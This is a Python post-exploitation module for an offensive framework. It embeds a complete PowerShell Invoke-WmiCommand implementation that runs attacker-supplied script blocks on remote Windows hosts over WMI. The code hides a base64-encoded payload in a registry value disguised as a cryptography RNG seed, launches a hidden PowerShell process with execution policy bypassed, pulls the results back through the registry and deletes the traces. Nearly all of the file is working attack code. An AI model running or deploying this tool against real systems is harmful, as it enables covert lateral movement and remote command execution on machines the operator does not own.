#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64
import os

class Module(Post):
    __info__ = {
        "name": "Invoke-WmiCommand",
        "description": "Executes a PowerShell ScriptBlock on a target computer using WMI as a pure C2 channel.",
        "author": "Matthew Graeber, KittySploit",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
    }

    payload = OptFile("", "Local path to the powershell payload script to execute", True)
    registry_hive = OptString("HKEY_CURRENT_USER", "Registry hive to use (HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, HKEY_CLASSES_ROOT, HKEY_USERS, HKEY_CURRENT_CONFIG)", False)
    registry_key_path = OptString(r"SOFTWARE\Microsoft\Cryptography\RNG", "Registry key where the payload and output will be stored", False)
    registry_payload_value = OptString("Seed", "Registry value name for payload", False)
    registry_result_value = OptString("Value", "Registry value name for result", False)
    computer_name = OptString("localhost", "Target computer name(s), comma separated", False)
    credential = OptString("", "Credential (Domain\\User) to use - prompt will appear or script will need manual adaptation for password", False)
    impersonation = OptInt(0, "Impersonation level (0-4)", False)
    authentication = OptInt(0, "Authentication level (-1 to 6)", False)
    enable_all_privileges = OptBool(False, "Enable all privileges", False)
    authority = OptString("", "Authority for WMI connection", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _remote_temp_dir(self) -> str:
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def run(self):
        try:
            with open(self.payload, "r", encoding="utf-8") as f:
                payload_script = f.read()
        except Exception as e:
            print_error(f"Failed to read payload file: {e}")
            return False

        ps1_script = r"""function Invoke-WmiCommand {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $True )]
        [ScriptBlock]
        $Payload,

        [String]
        [ValidateSet( 'HKEY_LOCAL_MACHINE',
                      'HKEY_CURRENT_USER',
                      'HKEY_CLASSES_ROOT',
                      'HKEY_USERS',
                      'HKEY_CURRENT_CONFIG' )]
        $RegistryHive = 'HKEY_CURRENT_USER',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryKeyPath = 'SOFTWARE\Microsoft\Cryptography\RNG',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryPayloadValueName = 'Seed',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryResultValueName = 'Value',

        [Parameter( ValueFromPipeline = $True )]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        switch ($RegistryHive) {
            'HKEY_LOCAL_MACHINE' { $Hive = 2147483650 }
            'HKEY_CURRENT_USER' { $Hive = 2147483649 }
            'HKEY_CLASSES_ROOT' { $Hive = 2147483648 }
            'HKEY_USERS' { $Hive = 2147483651 }
            'HKEY_CURRENT_CONFIG' { $Hive = 2147483653 }
        }

        $HKEY_LOCAL_MACHINE = 2147483650

        $WmiMethodArgs = @{}

        if ($PSBoundParameters['Credential']) { $WmiMethodArgs['Credential'] = $Credential }
        if ($PSBoundParameters['Impersonation']) { $WmiMethodArgs['Impersonation'] = $Impersonation }
        if ($PSBoundParameters['Authentication']) { $WmiMethodArgs['Authentication'] = $Authentication }
        if ($PSBoundParameters['EnableAllPrivileges']) { $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges }
        if ($PSBoundParameters['Authority']) { $WmiMethodArgs['Authority'] = $Authority }

        $AccessPermissions = @{
            KEY_QUERY_VALUE = 1
            KEY_SET_VALUE = 2
            KEY_CREATE_SUB_KEY = 4
            KEY_CREATE = 32
            DELETE = 65536
        }

        $RequiredPermissions = $AccessPermissions['KEY_QUERY_VALUE'] -bor
                               $AccessPermissions['KEY_SET_VALUE'] -bor
                               $AccessPermissions['KEY_CREATE_SUB_KEY'] -bor
                               $AccessPermissions['KEY_CREATE'] -bor
                               $AccessPermissions['DELETE']
    }

    PROCESS {
        foreach ($Computer in $ComputerName) {
            $WmiMethodArgs['ComputerName'] = $Computer

            Write-Verbose "[$Computer] Creating the following registry key: $RegistryHive\$RegistryKeyPath"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CreateKey' -ArgumentList $Hive, $RegistryKeyPath

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to create the following registry key: $RegistryHive\$RegistryKeyPath"
            }

            Write-Verbose "[$Computer] Validating read/write/delete privileges for the following registry key: $RegistryHive\$RegistryKeyPath"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CheckAccess' -ArgumentList $Hive, $RegistryKeyPath, $RequiredPermissions

            if (-not $Result.bGranted) {
                throw "[$Computer] You do not have permission to perform all the registry operations necessary for Invoke-WmiCommand."
            }

            $PSSettingsPath = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
            $PSPathValueName = 'Path'

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKEY_LOCAL_MACHINE, $PSSettingsPath, $PSPathValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\$PSSettingsPath\$PSPathValueName"
            }

            $PowerShellPath = $Result.sValue
            Write-Verbose "[$Computer] Full PowerShell path: $PowerShellPath"

            $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

            Write-Verbose "[$Computer] Storing the payload into the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $EncodedPayload, $RegistryPayloadValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to store the payload in the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            }

            $PayloadRunnerArgs = @"
                `$Hive = '$Hive'
                `$RegistryKeyPath = '$RegistryKeyPath'
                `$RegistryPayloadValueName = '$RegistryPayloadValueName'
                `$RegistryResultValueName = '$RegistryResultValueName'
                `n
"@

            $RemotePayloadRunner = $PayloadRunnerArgs + {
                $WmiMethodArgs = @{
                    Namespace = 'Root\default'
                    Class = 'StdRegProv'
                }

                $Result = Invoke-WmiMethod @WmiMethodArgs -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName

                if (($Result.ReturnValue -eq 0) -and ($Result.sValue)) {
                    $Payload = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Result.sValue))

                    $TempSerializedResultPath = [IO.Path]::GetTempFileName()

                    $PayloadResult = Invoke-Expression ($Payload)

                    Export-Clixml -InputObject $PayloadResult -Path $TempSerializedResultPath

                    $SerilizedPayloadText = [IO.File]::ReadAllText($TempSerializedResultPath)

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $SerilizedPayloadText, $RegistryResultValueName

                    Remove-Item -Path $SerilizedPayloadResult -Force

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName
                }
            }

            $Base64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RemotePayloadRunner))

            $Cmdline = "$PowerShellPath -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload"

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $Cmdline

            Start-Sleep -Seconds 5

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to execute payload stored within the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            }

            Write-Verbose "[$Computer] Payload successfully executed from: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable retrieve the payload results from the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"
            }

            Write-Verbose "[$Computer] Payload results successfully retrieved from: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"

            $SerilizedPayloadResult = $Result.sValue

            $TempSerializedResultPath = [IO.Path]::GetTempFileName()

            Out-File -InputObject $SerilizedPayloadResult -FilePath $TempSerializedResultPath
            $PayloadResult = Import-Clixml -Path $TempSerializedResultPath

            Remove-Item -Path $TempSerializedResultPath

            $FinalResult = New-Object PSObject -Property @{
                PSComputerName = $Computer
                PayloadOutput = $PayloadResult
            }

            Write-Verbose "[$Computer] Removing the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            Write-Verbose "[$Computer] Removing the following registry key: $RegistryHive\$RegistryKeyPath"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteKey' -ArgumentList $Hive, $RegistryKeyPath

            return $FinalResult
        }
    }
}
"""

        wrapper = [ps1_script]
        
        encoded_payload = self._encode_powershell(payload_script)
        
        script_block = f"{{ Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded_payload}'))) }}"

        invoke_cmd = [f"Invoke-WmiCommand -Payload {script_block}"]
        
        if self.registry_hive:
            invoke_cmd.extend(["-RegistryHive", f"'{self.registry_hive}'"])
        if self.registry_key_path:
            invoke_cmd.extend(["-RegistryKeyPath", f"'{self.registry_key_path}'"])
        if self.registry_payload_value:
            invoke_cmd.extend(["-RegistryPayloadValueName", f"'{self.registry_payload_value}'"])
        if self.registry_result_value:
            invoke_cmd.extend(["-RegistryResultValueName", f"'{self.registry_result_value}'"])
        
        computers = []
        if self.computer_name:
            computers = [c.strip() for c in self.computer_name.split(',')]
            comp_args = ",".join([f"'{c}'" for c in computers])
            invoke_cmd.extend(["-ComputerName", comp_args])

        if self.credential:
            invoke_cmd.extend(["-Credential", f"'{self.credential}'"])
            
        if self.impersonation > 0:
            invoke_cmd.extend(["-Impersonation", str(self.impersonation)])
            
        if self.authentication != 0:
            invoke_cmd.extend(["-Authentication", str(self.authentication)])
            
        if self.enable_all_privileges:
            invoke_cmd.append("-EnableAllPrivileges")
            
        if self.authority:
            invoke_cmd.extend(["-Authority", f"'{self.authority}'"])

        wrapper.append(" ".join(invoke_cmd))
        
        final_script = "\n".join(wrapper)
        
        out_file = self._remote_temp_dir() + "\\powershell_wmi_exec.out"

        wrapped_execution = (
            "$ProgressPreference='SilentlyContinue';"
            "$ErrorActionPreference='Continue';"
            f"& {{ {final_script} }} | Out-File -FilePath '{out_file}' -Width 4096 -Encoding UTF8"
        )

        encoded_cmd = self._encode_powershell(wrapped_execution)
        command = f"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"

        print_status("Executing PowerShell WMI payload. This may take some time...")
        self._execute_cmd(command)

        result = self._execute_cmd(f'type "{out_file}"')
        if result:
            print_success("Execution completed")
            print_info(result)
        else:
            print_warning("No output was returned or execution failed")

        self._execute_cmd(f'del /f /q "{out_file}"')

        return True
